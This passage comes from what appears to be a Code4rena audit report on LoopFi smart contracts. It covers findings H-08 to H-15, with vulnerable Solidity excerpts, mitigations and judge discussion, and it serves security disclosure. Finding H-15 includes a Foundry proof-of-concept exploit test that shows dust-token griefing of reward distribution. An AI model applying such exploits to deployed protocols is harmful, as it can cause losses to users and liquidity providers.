The attacker has their balance (before and after) the same 200000000000000000000. Stays as-is.

pkqs90 (warden) commented:

@Koolex - Apologies for replying out of PJQA phase, but I want to point out something that is not mentioned before. I misunderstood this issue in the beginning, and after going through the

# [H-08] vestTokens bug in MultiFeeDistribution.sol causes new incentives to erase previous incentives

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** H-08
- **Severity:** High
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

vestTokens bug in MultiFeeDistribution.sol causes new incentives to erase previous incentives Submitted by rscodes, also found by 0xpiken and novamanbg In MultiFeeDistribution.sol, the function _notifyReward(address rewardToken, uint256 reward) does not change r.rewardPerTokenStored and hence, relies on _updateReward(address account) to be called before any calls to _notifyReward. The rest of the functions who call _notifyReward follows this rule; except for vestTokens when it is called by a minter to give incentives to the lockers.

function vestTokens ( address user, uint256 amount, bool withPenalty ) external whenNotPaused { if (!

minters [ msg.

sender ]) revert InsufficientPermission (); if ( amount == 0 ) return; if ( user == address ( this )) { -> // minting to this contract adds the new tokens as incentives for lockers -> _notifyReward ( address ( rdntToken ), amount ); -> return; }......

} Since _updateReward is an internal function, we also cannot expect minters to call it on their side before calling vestTokens.

Hence, this bug results in rewardData[rewardToken].rewardPerTokenStored being inaccurate as it will not contain the previous results accumulated by the previous rewardData[rewardToken].rewardPerSecond when minters call vestTokens. This results in all lockers losing the rewards previously accumulated by the previous rewardPerSecond.

## Recommended Mitigation Steps

function vestTokens(address user, uint256 amount, bool withPenalty) external whenNotPaused { if (!minters[msg.sender]) revert InsufficientPermission(); if (amount == 0) return; if (user == address(this)) { // minting to this contract adds the new tokens as incentives for lockers + _updateReward(address(this)); _notifyReward(address(rdntToken), amount); return; }......

} Adding _updateReward(address(this)) will ensure rewardData[address(rdntToken)].rewardPerTokenStored is updated accordingly, so that lockers will not lose previously given incentives.

Tools Used Foundry, VSCode amarcu (LoopFi) confirmed 0xAlix2 (warden) commented:

@Koolex - The report shows a valid scenario where rewards are messed up; however, it is being confirmed by calling multiFeeDistribution.claimableRewards which is just a view function. However, when a user claims his rewards, after the mentioned scenario, he’ll be calling getReward which updates the rewards ( _updateReward(msg.sender); ), so the impact here is just in a view function. Hence, I believe this is a low finding.

radin100 (warden) commented:

I believe there is a mistake in the comment above. The issue is not just in a view function. The root cause is the following storage update here.

This is done without actually updating the rewardPerTokenStored from the _updateReward. As a result the reward for the period between now and the previous update will be erased. For example, check out the vestTokens function:

function vestTokens ( address user, uint256 amount, bool withPenalty ) external whenNotPaused { if (!

minters [ msg.

sender ]) revert InsufficientPermission (); if ( amount == 0 ) return; if ( user == address ( this )) { // minting to this contract adds the new tokens as incentives for lockers _notifyReward ( address ( rdntToken ), amount ); return; } Here _notifyReward is called.

function _notifyReward ( address rewardToken, uint256 reward ) internal { address operationExpenseReceiver_ = operationExpenseReceiver; uint256 operationExpenseRatio_ = operationExpenseRatio; if ( operationExpenseReceiver_ != address ( 0 ) && operationExpenseRatio_ != 0 ) { uint256 opExAmount = ( reward * operationExpenseRatio_ ) / RATIO_DIVISOR; if ( opExAmount != 0 ) { IERC20 ( rewardToken ).

safeTransfer ( operationExpenseReceiver_, opExAmount ); reward = reward - opExAmount; } Reward storage r = rewardData [ rewardToken ]; if ( block.

timestamp >= r.

periodFinish ) { r.

rewardPerSecond = ( reward * 1e12 ) / rewardsDuration; } else { uint256 remaining = r.

periodFinish - block.

timestamp; uint256 leftover = ( remaining * r.

rewardPerSecond ) / 1e12; r.

rewardPerSecond = (( reward + leftover ) * 1e12 ) / rewardsDuration; } >>> r.

lastUpdateTime = block.

timestamp; As you can see the lastUpdateTime is set without actually updating the rewardPerTokenStored. So next time the reward is updated, the rewardPerToken will not account for the missed period:

function rewardPerToken ( address rewardToken ) public view returns ( uint256 rptStored ) { rptStored = rewardData [ rewardToken ].

rewardPerTokenStored; if ( lockedSupplyWithMultiplier > 0 ) { >>> uint256 newReward = ( lastTimeRewardApplicable ( rewardToken ) - rewardData [ rewardToken ].

lastUpdateTime ) * rewardData [ rewardToken ].

rewardPerSecond; rptStored = rptStored + (( newReward * 1e18 ) / lockedSupplyWithMultiplier ); } As the new reward is calculated based on the lastUpdateTime which will wrongly be updated anytime vestTokens is called.

He’ll be calling getReward which updates the rewards ( _updateReward(msg.sender); ). When the user actually calls getReward the period between the time of calling vestTokens and the last time _updateReward was executed will actually be skipped because of the wrong storage update. As a result, anytime vestTokens is called, the notifyReward will skip reward periods erasing rewards, which is indeed a valid High.

# [H-09] decreaseLever uses incorrect position address when withdrawing

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** H-09
- **Severity:** High
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

decreaseLever uses incorrect position address when withdrawing Submitted by hash, also found by 0xAlix2, pkqs90, and nnez decreaseLever will always revert for Position4626 associated vaults.

## Recommended Mitigation Steps

Inside _onDecreaseLever, withdraw from leverParams.position instead.

Koolex (judge) increased severity to High amarcu (LoopFi) confirmed

# [H-10] Debt position interest is compounded while pool interest is simple causing inconsistency between expectedLiquidity_ and availableLiquidity_

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** H-10
- **Severity:** High
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

expectedLiquidity_ and availableLiquidity_ Submitted by hash, also found by Afriauditor and monrel Borrower’s will mostly end up paying more than the required amount of interest. This can also lead to lowered borrowing interest rates and final withdrawals to revert due to the inconsistency between the expected interest amount and the actually paid interest amount.

## Recommended Mitigation Steps

Change the index updation to align with the pool calculation (i.e., interestIndex = prevInterestIndex + baseInterest * timeElapsed.

## Assessed type

Math 0xtj24 (LoopFi) acknowledged Koolex (judge) increased severity to High

# [H-11] It is nearly impossble for Liquidators to use liquidatePosition() to fully pay off a non bad-debt position

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** H-11
- **Severity:** High
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

liquidatePosition() to fully pay off a non bad-debt position Submitted by pkqs90, also found by Evo First, we need to know how liquidation of a non bad-debt position works. The liquidator passes the amount repayAmount, pays a penalty, and buys the position collateral at a discount price.

The issue here is after deducting the penalty, the repayAmount must be exactly equal to the amount of debt at the current second in order to completely pay off the debt. Aligning with the code, this means the repayAmount * liquidationPenalty must be equal to calcTotalDebt(debtData). If it is larger, the liquidation would fail due to integer underflow in calcDecrease().

However, since the result of calcTotalDebt(debtData) is increasing as time passes, and the transaction cannot pinpoint which second it is executed, the liquidator cannot know the amount of calcTotalDebt(debtData).

This means it is nearly impossible for liquidators to fully pay off the non bad-debt position, which is unexpected.

function liquidatePosition ( address owner, uint256 repayAmount ) external whenNotPaused { // validate params if ( owner == address ( 0 ) || repayAmount == 0 ) revert CDPVault__liquidatePosition_invalidParameters (); // load configs VaultConfig memory config = vaultConfig; LiquidationConfig memory liqConfig_ = liquidationConfig; // load liquidated position Position memory position = positions [ owner ]; DebtData memory debtData = _calcDebt ( position ); // load price and calculate discounted price uint256 spotPrice_ = spotPrice (); uint256 discountedPrice = wmul ( spotPrice_, liqConfig_.

liquidationDiscount ); if ( spotPrice_ == 0 ) revert CDPVault__liquidatePosition_invalidSpotPrice (); // Ensure that there's no bad debt if ( calcTotalDebt ( debtData ) > wmul ( position.

collateral, spotPrice_ )) revert CDPVault__BadDebt (); // compute collateral to take, debt to repay and penalty to pay uint256 takeCollateral = wdiv ( repayAmount, discountedPrice ); uint256 deltaDebt = wmul ( repayAmount, liqConfig_.

liquidationPenalty ); uint256 penalty = wmul ( repayAmount, WAD - liqConfig_.

liquidationPenalty ); if ( takeCollateral > position.

collateral ) revert CDPVault__tooHighRepayAmount (); // verify that the position is indeed unsafe if ( _isCollateralized ( calcTotalDebt ( debtData ), wmul ( position.

collateral, spotPrice_ ), config.

liquidationRatio )) revert CDPVault__liquidatePosition_notUnsafe (); // transfer the repay amount from the liquidator to the vault poolUnderlying.

safeTransferFrom ( msg.

sender, address ( pool ), repayAmount - penalty ); uint256 newDebt; uint256 profit; uint256 maxRepayment = calcTotalDebt ( debtData ); uint256 newCumulativeIndex; > if ( deltaDebt == maxRepayment ) { newDebt = 0; newCumulativeIndex = debtData.

cumulativeIndexNow; profit = debtData.

accruedInterest; position.

cumulativeQuotaInterest = 0; } else { // @auditnote: If deltaDebt > maxRepayment, the following code would underflow and revert.

> ( newDebt, newCumulativeIndex, profit, position.

cumulativeQuotaInterest ) = calcDecrease ( deltaDebt, // delta debt debtData.

debt, debtData.

cumulativeIndexNow, // current cumulative base interest index in Ray debtData.

cumulativeIndexLastUpdate, debtData.

cumulativeQuotaInterest ); } position.

cumulativeQuotaIndexLU = debtData.

cumulativeQuotaIndexNow; // update liquidated position position = _modifyPosition ( owner, position, newDebt, newCumulativeIndex, - toInt256 ( takeCollateral ), totalDebt ); pool.

repayCreditAccount ( debtData.

debt - newDebt, profit, 0 ); // U:[CM-11] // transfer the collateral amount from the vault to the liquidator token.

safeTransfer ( msg.

sender, takeCollateral ); // Mint the penalty from the vault to the treasury poolUnderlying.

safeTransferFrom ( msg.

sender, address ( pool ), penalty ); IPoolV3Loop ( address ( pool )).

mintProfit ( penalty ); if ( debtData.

debt - newDebt != 0 ) { IPoolV3 ( pool ).

updateQuotaRevenue ( _calcQuotaRevenueChange (- int ( debtData.

debt - newDebt ))); // U:[PQK-15] }

## Recommended Mitigation Steps

Add a check where if deltaDebt > maxRepayment, set the deltaDebt to maxRepayment, and reverse calculate the repayAmount by maxRepayment / liquidationPenalty.

0xtj24 (LoopFi) disputed and commented:

Liquidator can estimate the exact debt with:

/// @notice Returns the total debt of a position /// @param position Address of the position /// @return totalDebt Total debt of the position [wad] function virtualDebt ( address position ) external view returns ( uint256 ) { return calcTotalDebt ( _calcDebt ( positions [ position ])); } and thus repaying the exact position’s debt.

Koolex (judge) increased severity to High and commented:

However, since the result of calcTotalDebt ( debtData ) is increasing as time passes, and the transaction cannot pinpoint which second it is executed, the liquidator cannot know the amount of calcTotalDebt ( debtData ).

While Liquidator can estimate the exact debt with virtualDebt, there is a time window between the transaction sent and processed, during this, the debt could increase. Over time, bad debt will accumulate.

0xAlix2 (warden) commented:

While Liquidator can estimate the exact debt with virtualDebt, there is a time window between the transaction sent and processed, during this, the debt could increase. Over time, bad debt will accumulate.

@Koolex - I agree with this; however, this could be considered a user error. Since a user could simply call liquidatePosition(position, virtualDebt(position)), the mentioned scenario won’t happen, and everything will work as expected.

Hence, I believe this is a valid low.

pkqs90 (warden) commented:

@0xAlix2 - The point is due to the nature of blockchain, there is a time window between initiation of a transaction and execution of transaction. The initiation of a transaction most likely happen through a frontend request, and not by some blockchain code.

Koolex (judge) commented:

Thank you for the feedback. No mitigation on the front-end could mitigate this. Any suggested mitigation can protect is on-chain. Stays as-is.

# [H-12] CDPVault.sol#liquidatePositionBadDebt() should not set profit = 0 when calling pool.repayCreditAccount()

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** H-12
- **Severity:** High
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

CDPVault.sol#liquidatePositionBadDebt() should not set profit = 0 when calling pool.repayCreditAccount() Submitted by pkqs90, also found by hearmen

- https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L624
- https://github.com/code-423n4/2024-07-loopfi/blob/main/src/PoolV3.sol#L529-L576

## Impact

CDPVault.sol#liquidatePositionBadDebt() should not set profit = 0 when calling pool.repayCreditAccount(), as this would cause a loss of funds to lpETH stakers.

Bug Description First we need to understand how liquidatePositionBadDebt() works. When there is a bad debt detected for a position, any liquidator can come and liquidate the position. The liquidator is required to buy ALL the collateral at a discount price, and the loss ( totalDebt - repayAmount ) is sent to PoolV3 to be beared by the lpETH stakers.

This is all good, but the issue here is that when the liquidator repays the debt, it is compared against the totalDebt of the position, which includes the interest. This interest should also be sent to the lpETH stakers, but is currently not, which would result in loss of funds for the lpETH stakers.

An example:

CDPVault position has debt principal == 100 0, debt interest == 500. Total debt == 1500. Collateral value == 1600, discount == 90%, discount value == 1440.

Liquidator comes and pay off 1440, loss is 1500-1440 = 60, so pool.repayCreditAccount(1000, 0, 60) is called.

The loss is 60, and the same amount of lpETH is burned from the StakingLPEth contract.

However, the issue here is, the liquidator also paid off 440 of debt interest, and is not sent to the StakingLPEth as profit. This means the 440 amount of underlying token (WETH) would be stuck in PoolV3, with no lpETH to redeem it.

Note that the current implementation is similar to GearboxV3. However, the profit concept is completely different, so it is incorrect for LoopFi.

CDPVault.sol:

function liquidatePositionBadDebt ( address owner, uint256 repayAmount ) external whenNotPaused { // validate params if ( owner == address ( 0 ) || repayAmount == 0 ) revert CDPVault__liquidatePosition_invalidParameters (); // load configs VaultConfig memory config = vaultConfig; LiquidationConfig memory liqConfig_ = liquidationConfig; // load liquidated position Position memory position = positions [ owner ]; DebtData memory debtData = _calcDebt ( position ); uint256 spotPrice_ = spotPrice (); if ( spotPrice_ == 0 ) revert CDPVault__liquidatePosition_invalidSpotPrice (); // verify that the position is indeed unsafe if ( _isCollateralized ( calcTotalDebt ( debtData ), wmul ( position.

collateral, spotPrice_ ), config.

liquidationRatio )) revert CDPVault__liquidatePosition_notUnsafe (); // load price and calculate discounted price uint256 discountedPrice = wmul ( spotPrice_, liqConfig_.

liquidationDiscount ); // Ensure that the debt is greater than the collateral at discounted price if ( calcTotalDebt ( debtData ) <= wmul ( position.

collateral, discountedPrice )) revert CDPVault__noBadDebt (); // compute collateral to take, debt to repay uint256 takeCollateral = wdiv ( repayAmount, discountedPrice ); if ( takeCollateral < position.

collateral ) revert CDPVault__repayAmountNotEnough (); // account for bad debt takeCollateral = position.

collateral; repayAmount = wmul ( takeCollateral, discountedPrice ); uint256 loss = calcTotalDebt ( debtData ) - repayAmount; // transfer the repay amount from the liquidator to the vault poolUnderlying.

safeTransferFrom ( msg.

sender, address ( pool ), repayAmount ); position.

cumulativeQuotaInterest = 0; position.

cumulativeQuotaIndexLU = debtData.

cumulativeQuotaIndexNow; // update liquidated position position = _modifyPosition ( owner, position, 0, debtData.

cumulativeIndexNow, - toInt256 ( takeCollateral ), totalDebt ); @> pool.

repayCreditAccount ( debtData.

debt, 0, loss ); // U:[CM-11] // transfer the collateral amount from the vault to the liquidator token.

safeTransfer ( msg.

sender, takeCollateral ); int256 quotaRevenueChange = _calcQuotaRevenueChange (- int ( debtData.

debt )); if ( quotaRevenueChange != 0 ) { IPoolV3 ( pool ).

updateQuotaRevenue ( quotaRevenueChange ); // U:[PQK-15] } PoolV3.sol:

function repayCreditAccount ( uint256 repaidAmount, uint256 profit, uint256 loss ) external override creditManagerOnly // U:[LP-2C] whenNotPaused // U:[LP-2A] nonReentrant // U:[LP-2B] { uint128 repaidAmountU128 = repaidAmount.

toUint128 (); DebtParams storage cmDebt = _creditManagerDebt [ msg.

sender ]; uint128 cmBorrowed = cmDebt.

borrowed; if ( cmBorrowed == 0 ) { revert CallerNotCreditManagerException (); // U:[LP-2C,14A] } > if ( profit > 0 ) { > _mint ( treasury, convertToShares ( profit )); // U:[LP-14B] > } else if ( loss > 0 ) { address treasury_ = treasury; uint256 sharesInTreasury = balanceOf ( treasury_ ); uint256 sharesToBurn = convertToShares ( loss ); if ( sharesToBurn > sharesInTreasury ) { unchecked { emit IncurUncoveredLoss ({ creditManager:

msg.

sender, loss:

convertToAssets ( sharesToBurn - sharesInTreasury ) }); // U:[LP-14D] } sharesToBurn = sharesInTreasury; } _burn ( treasury_, sharesToBurn ); // U:[LP-14C,14D] } _updateBaseInterest ({ expectedLiquidityDelta:

- loss.

toInt256 (), availableLiquidityDelta:

0, checkOptimalBorrowing:

false }); // U:[LP-14B,14C,14D] _totalDebt.

borrowed -= repaidAmountU128; // U:[LP-14B,14C,14D] cmDebt.

borrowed = cmBorrowed - repaidAmountU128; // U:[LP-14B,14C,14D] emit Repay ( msg.

sender, repaidAmount, profit, loss ); // U:[LP-14B,14C,14D] }

## Recommended Mitigation Steps

In CDPVault, change to pool.repayCreditAccount(debtData.debt, debtData.accruedInterest, loss).

In PoolV3:

if (profit > 0) { _mint(treasury, convertToShares(profit)); // U:[LP-14B] + } + if (loss > 0) - } else if (loss > 0) {...

} 0xtj24 (LoopFi) confirmed

# [H-13] Flashlender.sol#flashLoan() should use mintProfit() to mint fees, as the current implementation may lead to locked up WETH in PoolV3

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** H-13
- **Severity:** High
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

Flashlender.sol#flashLoan() should use mintProfit() to mint fees, as the current implementation may lead to locked up WETH in PoolV3 Submitted by pkqs90, also found by 0xAlix2, hearmen, web3km, Bigsam, lian886, Infect3d, Bauchibred, crypticdefense, Spearmint, grearlake, Ruhum, karsar, and hash When using flashlender to create loans, there is small amount of fees. The fees are sent to PoolV3 and is spread out to the lpETH stakers.

The issue is, the current implementation uses pool.repayCreditAccount() to add the profit, by setting the profit == fees. This is incorrect, and the correct implementation should be to use pool.mintProfit() to send the fees.

Both implementation mints the extra fees as lpETH to the StakingLPEth.sol contract, which is correct. However, the current implementation does NOT update the expectedLiquidity, since it assumes the profit is a part of the interest that should be paid by debt borrowers, and is already included, which is incorrect.

We can see the mintProfit() function also adds the amount of fees to the expectedLiquidity, since this is a different kind of fees than debt interest.

The impact of this issue is that the WETH amount in PoolV3 would be larger than expectedLiquidity. Since lpETH:WETH is always 1:1, when users want to withdraw the WETH, it may revert due to underflow when updating expectedLiquidity. An example is:

Currently there is 100 lpETH, 100 WETH, expectedLiquidity == 100 WETH inside PoolV3.

Flashloan fees of 10 WETH comes in, lpETH is 110 lpETH, WETH is 110 WETH, but expectedLiquidity is still 100 WETH.

All lpETH users try to withdraw their WETH. Note that there is enough WETH in PoolV3, but since during withdraw, the expectedLiquidity is also updated, so only 100 WETH is allow for withdraw, or else there would be an integer underflow.

Note that CDPVault also uses mintProfit() to send the extra liquidation penalty as profit to PoolV3.

- https://github.com/code-423n4/2024-07-loopfi/blob/main/src/CDPVault.sol#L569
Flashlender.sol:

function flashLoan ( IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data ) external override nonReentrant returns ( bool ) { if ( token != address ( underlyingToken )) revert Flash__flashLoan_unsupportedToken (); uint256 fee = wmul ( amount, protocolFee ); uint256 total = amount + fee; pool.

lendCreditAccount ( amount, address ( receiver )); emit FlashLoan ( address ( receiver ), token, amount, fee ); if ( receiver.

onFlashLoan ( msg.

sender, token, amount, fee, data ) != CALLBACK_SUCCESS ) revert Flash__flashLoan_callbackFailed (); // reverts if not enough Stablecoin have been send back underlyingToken.

transferFrom ( address ( receiver ), address ( pool ), total ); @> pool.

repayCreditAccount ( total - fee, fee, 0 ); // @BUG. SHOULD USE pool.mintProfit().

return true; } PoolV3.sol:

function repayCreditAccount ( uint256 repaidAmount, uint256 profit, uint256 loss ) external override creditManagerOnly // U:[LP-2C] whenNotPaused // U:[LP-2A] nonReentrant // U:[LP-2B] { if ( profit > 0 ) { _mint ( treasury, convertToShares ( profit )); // U:[LP-14B] } else if ( loss > 0 ) {...

} _updateBaseInterest ({ @> expectedLiquidityDelta:

- loss.

toInt256 (), availableLiquidityDelta:

0, checkOptimalBorrowing:

false }); // U:[LP-14B,14C,14D] } function mintProfit ( uint256 amount ) external creditManagerOnly { _mint ( treasury, amount ); _updateBaseInterest ({ @> expectedLiquidityDelta:

amount.

toInt256 (), availableLiquidityDelta:

0, checkOptimalBorrowing:

false }); // U:[LP-14B,14C,14D] } function _withdraw ( address receiver, address owner, uint256 assetsSent, uint256 assetsReceived, uint256 amountToUser, uint256 shares ) internal { if ( msg.

sender != owner ) _spendAllowance ({ owner:

owner, spender:

msg.

sender, amount:

shares }); // U:[LP-8,9] _burn ( owner, shares ); // U:[LP-8,9] _updateBaseInterest ({ > expectedLiquidityDelta:

- assetsSent.

toInt256 (), > availableLiquidityDelta:

- assetsSent.

toInt256 (), checkOptimalBorrowing:

false }); // U:[LP-8,9] // @INTEGER UNDERFLOW WOULD OCCUR HERE.

IERC20 ( underlyingToken ).

safeTransfer ({ to:

receiver, value:

amountToUser }); // U:[LP-8,9] if ( assetsSent > amountToUser ) { unchecked { IERC20 ( underlyingToken ).

safeTransfer ({ to:

treasury, value:

assetsSent - amountToUser }); // U:[LP-8,9] } emit Withdraw ( msg.

sender, receiver, owner, assetsReceived, shares ); // U:[LP-8,9] }

## Recommended Mitigation Steps

Use mintProfit() to mint flashloan fees instead.

amarcu (LoopFi) confirmed

# [H-14] An infinite loop in MultiFeeDistribution.sol withdraw

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** H-14
- **Severity:** High
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

MultiFeeDistribution.sol withdraw Submitted by novamanbg, also found by novamanbg and 0x40saoirse An infinite loop will block the withdraw process.

## Recommended Mitigation Steps

Rewrite the code the following way:

if ( earnedAmount == 0 ) { i ++; continue; }

## Assessed type

Loop amarcu (LoopFi) confirmed

# [H-15] Directly sending dust token amount will slow down distribution in MultiFeeDistribution.sol

- **Contest:** LoopFi
- **Slug:** 2024-07-loopfi
- **Finding ID:** H-15
- **Severity:** High
- **Source URL:** https://code4rena.com/reports/2024-07-loopfi
- **Source snapshot:** competitions/2024-07-loopfi/final_report.html

MultiFeeDistribution.sol Submitted by novamanbg While sending a small amount and calling getReward is a typical example of griefing which is normally considered Medium. Given the low cost of the attack and that no specific external conditions need to be met as well as the high impact for all the users of the protocol I consider it High severity.

## Recommended Mitigation Steps

_notifyUnseenReward should not be in functions without access control for trusted protocol roles, as griefing would always be possible. If you still want the unseen amount to be updated frequently consider value-weighted time additions to the vesting.

amarcu (LoopFi) confirmed Koolex (judge) decreased severity to Medium and commented:

Requesting a PoC (coded) to evaluate the risk based on real numbers. Only in PJ QA, please.

radin100 (warden) commented:

I created two tests to show the attack once and multiple times.

// SPDX-License-Identifier: UNLICENSED pragma solidity ^ 0.8.

19; import { TestBase, console } from "../TestBase.sol"; import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol"; import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol"; import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol"; import { ERC20Mock } from "@openzeppelin/contracts/mocks/ERC20Mock.sol"; import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol"; import { WAD } from "../../utils/Math.sol"; import { IVaultRegistry } from "../../interfaces/IVaultRegistry.sol"; import { MultiFeeDistribution } from "../../reward/MultiFeeDistribution.sol"; import { IMultiFeeDistribution } from "../../reward/interfaces/IMultiFeeDistribution.sol"; import { IPriceProvider } from "../../reward/interfaces/IPriceProvider.sol"; import { IChefIncentivesController } from "../../reward/interfaces/IChefIncentivesController.sol"; import { LockedBalance, Balances } from "../../reward/interfaces/LockedBalance.sol"; import { Reward } from "../../reward/interfaces/LockedBalance.sol"; // chefIncentivesController.setEligibilityExempt(user, false); // chefIncentivesController.afterLockUpdate(user); contract MockController { constructor () {} function setEligibilityExempt ( address user, bool info ) external view {} function afterLockUpdate ( address user ) external view {} } contract MockPriceProvider { constructor () {} function getRewardTokenPrice

( address rewardToken, uint256 reward ) external view returns ( uint256 ) { return 0; } function update () external view {} } contract MultiFeeDistributionTest is TestBase { using SafeERC20 for IERC20; MultiFeeDistribution internal multiFeeDistribution; ERC20Mock public loopToken; ERC20Mock public stakeToken; ERC20Mock public rewardToken; MockPriceProvider public m; MockController public controller1; address internal mockPriceProvider; address internal mockLockZap; address internal mockDao; uint256 public rewardsDuration = 30 days; uint256 public rewardsLookback = 1 days; uint256 public lockDuration = 10 days; uint256 public burnRatio = 50000; // 50% uint256 public vestDuration

= 30 days; function setUp () public virtual override { super.

setUp (); mockLockZap = vm.

addr ( uint256 ( keccak256 ( "lockZap" ))); mockDao = vm.

addr ( uint256 ( keccak256 ( "dao" ))); m = new MockPriceProvider (); controller1 = new MockController (); mockPriceProvider = address ( m ); loopToken = new ERC20Mock (); stakeToken = new ERC20Mock (); rewardToken = new ERC20Mock (); multiFeeDistribution = MultiFeeDistribution ( address ( new ERC1967Proxy ( address ( new MultiFeeDistribution ()), abi.

encodeWithSelector ( MultiFeeDistribution.

initialize.

selector, address ( loopToken ), mockLockZap, mockDao, mockPriceProvider, rewardsDuration, rewardsLookback, lockDuration, burnRatio, vestDuration ) ); } function _addLockDurations () internal returns ( uint256 len ) { len = 4; uint256 [] memory lockDurations = new uint256 []( len ); uint256 [] memory rewardMultipliers = new uint256 []( len ); lockDurations [ 0 ] = 2592000; lockDurations [ 1 ] = 7776000; lockDurations [ 2 ] = 15552000; lockDurations [ 3 ] = 31104000; rewardMultipliers [ 0 ] = 1; rewardMultipliers [ 1 ] = 4; rewardMultipliers [ 2 ] = 10; rewardMultipliers [ 3 ] = 25; multiFeeDistribution.

setLockTypeInfo ( lockDurations, rewardMultipliers ); } function test_exploit_once () public { uint256 amount = 10 ether; address alice = vm.

addr ( uint256 ( keccak256 ( "Alice" ))); address bob = vm.

addr ( uint256 ( keccak256 ( "Bob" ))); address minter = vm.

addr ( uint256 ( keccak256 ( "minter" ))); address [] memory minters = new address []( 1 ); minters [ 0 ] = minter; address [] memory rewards = new address []( 1 ); rewards [ 0 ] = address ( rewardToken ); uint256 len = _addLockDurations (); uint256 typeIndex = 0; stakeToken.

mint ( alice, amount ); rewardToken.

mint ( minter, 100 ether ); //the reward will be 100 ether rewardToken.

mint ( bob, 0.1 ether ); //bob will have a very small amount multiFeeDistribution.

setLPToken ( address ( stakeToken )); address incentivesController = address ( controller1 ); address treasury = vm.

addr ( uint256 ( keccak256 ( "treasury" ))); multiFeeDistribution.

setAddresses ( IChefIncentivesController ( incentivesController ), treasury ); vm.

mockCall ( incentivesController, abi.

encodeWithSelector ( IChefIncentivesController.

afterLockUpdate.

selector, alice ), abi.

encode ( true ) ); vm.

prank ( alice ); stakeToken.

approve ( address ( multiFeeDistribution ), amount ); vm.

prank ( alice ); multiFeeDistribution.

stake ( amount, alice, 1 ); multiFeeDistribution.

setMinters ( minters ); vm.

prank ( minter ); multiFeeDistribution.

addReward ( address ( rewardToken )); vm.

prank ( minter ); rewardToken.

transfer ( address ( multiFeeDistribution ), 100 ether ); vm.

warp ( block.

timestamp ); vm.

prank ( alice ); multiFeeDistribution.

getReward ( rewards ); vm.

warp ( block.

timestamp + 20 days ); vm.

prank ( alice ); multiFeeDistribution.

getReward ( rewards ); uint256 balanceBefore = rewardToken.

balanceOf ( address ( alice )); uint256 dailyTokens1 = rewardToken.

balanceOf ( address ( alice )) / 20; // the amount that alice has devided by the 20 days console.

log ( "daily rewards under normal conditions" ); console.

log ( dailyTokens1 ); //These are the tokens that alice gets per day - 3.33e18 vm.

prank ( bob ); rewardToken.

transfer ( address ( multiFeeDistribution ), 1 ); //bob transfers the dust amount vm.

prank ( bob ); multiFeeDistribution.

getReward ( rewards ); //calls get reward to update the rate vm.

warp ( block.

timestamp + 1 days ); vm.

prank ( alice ); multiFeeDistribution.

getReward ( rewards ); uint256 dailyTokens2 = rewardToken.

balanceOf ( address ( alice )) - balanceBefore; balanceBefore = rewardToken.

balanceOf ( address ( alice )); console.

log ( "New daily token rewards:" ); console.

log ( dailyTokens2 ); //1e18 //at the end bob managed to make it 0.326912783616223995 per day and he can slow it down as much as he wants //What is more is that alice will have to wait for another 30 days!

console.

log ( "spent by bob on the attack NOT e18" ); console.

log ( 0.1 ether - rewardToken.

balanceOf ( address ( bob ))); //Bob spent 20(not 0.20e18) console.

log ( "Pending rewards that the user will get after another 30 days instead of two of nobody does the attack again:" ); console.

log ( rewardToken.

balanceOf ( address ( multiFeeDistribution ))); //the assets that will be distributed for the next 30 days instead of two } function test_exploit_multiple_times () public { uint256 amount = 10 ether; address alice = vm.

addr ( uint256 ( keccak256 ( "Alice" ))); address bob = vm.

addr ( uint256 ( keccak256 ( "Bob" ))); address minter = vm.

addr ( uint256 ( keccak256 ( "minter" ))); address [] memory minters = new address []( 1 ); minters [ 0 ] = minter; address [] memory rewards = new address []( 1 ); rewards [ 0 ] = address ( rewardToken ); uint256 len = _addLockDurations (); uint256 typeIndex = 0; stakeToken.

mint ( alice, amount ); rewardToken.

mint ( minter, 100 ether ); //the reward will be 100 ether rewardToken.

mint ( bob, 0.1 ether ); //bob will have a very small amount multiFeeDistribution.

setLPToken ( address ( stakeToken )); address incentivesController = address ( controller1 ); address treasury = vm.

addr ( uint256 ( keccak256 ( "treasury" ))); multiFeeDistribution.

setAddresses ( IChefIncentivesController ( incentivesController ), treasury ); vm.

mockCall ( incentivesController, abi.

encodeWithSelector ( IChefIncentivesController.

afterLockUpdate.

selector, alice ), abi.

encode ( true ) ); vm.

prank ( alice ); stakeToken.

approve ( address ( multiFeeDistribution ), amount ); vm.

prank ( alice ); multiFeeDistribution.

stake ( amount, alice, 1 ); multiFeeDistribution.

setMinters ( minters ); vm.

prank ( minter ); multiFeeDistribution.

addReward ( address ( rewardToken )); vm.

prank ( minter ); rewardToken.

transfer ( address ( multiFeeDistribution ), 100 ether ); vm.

warp ( block.

timestamp ); vm.

prank ( alice ); multiFeeDistribution.

getReward ( rewards ); vm.

warp ( block.

timestamp + 20 days ); vm.

prank ( alice ); multiFeeDistribution.

